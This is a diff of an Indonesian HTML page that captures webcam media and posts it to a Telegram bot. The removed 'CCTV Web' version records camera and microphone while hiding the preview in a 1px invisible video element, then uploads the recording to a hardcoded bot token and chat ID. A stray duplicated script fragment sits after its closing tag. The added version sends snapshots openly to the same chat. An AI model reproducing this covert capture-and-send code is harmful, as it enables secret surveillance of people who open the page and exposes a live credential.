@@ -1,174 +1,92 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CCTV Web</title>
-<style>
-  body { font-family:sans-serif; margin:0; padding:0; background:#111; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; }
-  h1,h2 { text-align:center; }
-  input, button { padding:10px; margin:5px; font-size:16px; border-radius:5px; border:none; }
-  button { cursor:pointer; background:#0f0; color:#000; }
-  video { width:1px; height:1px; opacity:0; position:absolute; top:0; left:0; }
-  #cctvPanel, #adminPanel { display:none; flex-direction:column; align-items:center; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kamera Kirim Telegram</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    video, canvas {
+      width: 90%;
+      max-width: 400px;
+      border: 2px solid #0f0;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      font-size: 16px;
+      background: #0f0;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #090;
+      color: #fff;
+    }
+  </style>
 </head>
 <body>
+  <h2>📸 Kamera Kirim Telegram</h2>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <br>
+  <button id="snap">Ambil Foto & Kirim</button>
 
-<h1>CCTV Web</h1>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snapBtn = document.getElementById('snap');
 
-<div id="mainPanel">
-  <button id="registerCCTVBtn">Daftar CCTV Baru</button>
-  <button id="adminLoginBtn">Login Admin</button>
-</div>
+    // Token & ID Telegram (punya kamu)
+    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
+    const CHAT_ID = "7412613560";
 
-<!-- Form pendaftaran CCTV -->
-<div id="cctvPanel">
-  <h2>Daftar CCTV Baru</h2>
-  <input type="text" id="cctvName" placeholder="Nama CCTV">
-  <button id="startCCTVBtn">Minta Izin & Mulai Rekam</button>
-  <button id="stopCCTVBtn">Hentikan & Kirim</button>
-  <video id="video" autoplay playsinline></video>
-</div>
+    // Minta akses kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("Gagal akses kamera: " + err);
+      });
 
-<!-- Admin Panel -->
-<div id="adminPanel">
-  <h2>Admin Panel</h2>
-  <input type="password" id="adminPass" placeholder="Password Admin">
-  <button id="loginAdminBtn">Login</button>
+    // Ambil foto dan kirim ke Telegram
+    snapBtn.addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  <div id="controlPanel" style="display:none;">
-    <h3>Daftar CCTV Terdaftar</h3>
-    <ul id="cctvList"></ul>
-    <button id="adminStartBtn">Mulai Semua Rekam</button>
-    <button id="adminStopBtn">Hentikan Semua & Kirim</button>
-  </div>
-</div>
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "foto.jpg");
 
-<script>
-const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
-const CHAT_ID = "7412613560";
-const ADMIN_PASS = "1234";
-
-let recorder, chunks = [], stream;
-let cctvName = "";
-
-const mainPanel = document.getElementById('mainPanel');
-const cctvPanel = document.getElementById('cctvPanel');
-const adminPanel = document.getElementById('adminPanel');
-const controlPanel = document.getElementById('controlPanel');
-const video = document.getElementById('video');
-const cctvList = document.getElementById('cctvList');
-
-document.getElementById('registerCCTVBtn').onclick = () => {
-  mainPanel.style.display = 'none';
-  cctvPanel.style.display = 'flex';
-};
-
-document.getElementById('startCCTVBtn').onclick = async () => {
-  cctvName = document.getElementById('cctvName').value || "CCTV-" + Date.now();
-  try {
-    // Minta izin kamera & mikrofon
-    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
-    video.srcObject = stream;
-
-    recorder = new MediaRecorder(stream);
-    chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.start();
-    alert("Rekaman dimulai: "+cctvName);
-  } catch(err){
-    alert("Akses kamera/mikrofon ditolak atau error: "+err);
-  }
-};
-
-document.getElementById('stopCCTVBtn').onclick = async () => {
-  if(recorder && recorder.state !== 'inactive') recorder.stop();
-  if(stream) stream.getTracks().forEach(track => track.stop());
-
-  recorder.onstop = async ()=>{
-    const blob = new Blob(chunks,{type:"video/webm"});
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("video", blob, cctvName+".webm");
-
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:"POST", body:formData });
-      alert("✅ Video dikirim ke Telegram!");
-    } catch(err){ alert("❌ Gagal kirim: "+err); }
-  };
-};
-
-// Admin login
-document.getElementById('adminLoginBtn').onclick = ()=>{
-  mainPanel.style.display = 'none';
-  adminPanel.style.display = 'flex';
-};
-
-document.getElementById('loginAdminBtn').onclick = ()=>{
-  if(document.getElementById('adminPass').value === ADMIN_PASS){
-    controlPanel.style.display='flex';
-    cctvList.innerHTML = `<li>${cctvName || "Belum ada CCTV"}</li>`;
-  } else alert("Password salah!");
-};
-
-// Tombol admin kontrol (placeholder)
-document.getElementById('adminStartBtn').onclick = ()=>{ alert("Mulai semua CCTV (perlu implementasi remote)"); };
-document.getElementById('adminStopBtn').onclick = ()=>{ alert("Hentikan semua CCTV & kirim (perlu implementasi remote)"); };
-</script>
-
-</body>
-</html>  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
-    video.srcObject = stream;
-
-    recorder = new MediaRecorder(stream);
-    chunks = [];
-    recorder.ondataavailable = e=>chunks.push(e.data);
-    recorder.start();
-    alert("Rekaman dimulai: "+cctvName);
-  } catch(err){ alert("Error: "+err); }
-};
-
-document.getElementById('stopCCTVBtn').onclick = async () => {
-  if(recorder && recorder.state !== 'inactive') recorder.stop();
-  if(stream) stream.getTracks().forEach(track=>track.stop());
-
-  recorder.onstop = async ()=>{
-    const blob = new Blob(chunks,{type:"video/webm"});
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("video", blob, cctvName+".webm");
-
-    try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:"POST", body:formData });
-      alert("✅ Video dikirim ke Telegram!");
-    } catch(err){ alert("❌ Gagal kirim: "+err); }
-  };
-};
-
-// Admin login
-document.getElementById('adminLoginBtn').onclick = ()=>{
-  mainPanel.style.display = 'none';
-  adminPanel.style.display = 'flex';
-};
-
-document.getElementById('loginAdminBtn').onclick = ()=>{
-  if(document.getElementById('adminPass').value === ADMIN_PASS){
-    controlPanel.style.display='flex';
-    // Tambahkan daftar CCTV terdaftar
-    cctvList.innerHTML = `<li>${cctvName || "Belum ada CCTV"}</li>`;
-  } else alert("Password salah!");
-};
-
-// Admin control tombol (opsional, bisa dikembangkan)
-document.getElementById('adminStartBtn').onclick = ()=>{
-  alert("Mulai semua CCTV (perlu implementasi WebRTC atau trigger remote)");
-};
-document.getElementById('adminStopBtn').onclick = ()=>{
-  alert("Hentikan semua CCTV & kirim (perlu implementasi WebRTC atau trigger remote)");
-};
-</script>
-
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            alert("✅ Foto berhasil dikirim ke Telegram!");
+          } else {
+            alert("❌ Gagal kirim: " + JSON.stringify(data));
+          }
+        })
+        .catch(err => alert("Error: " + err));
+      }, "image/jpeg");
+    });
+  </script>
 </body>
 </html>
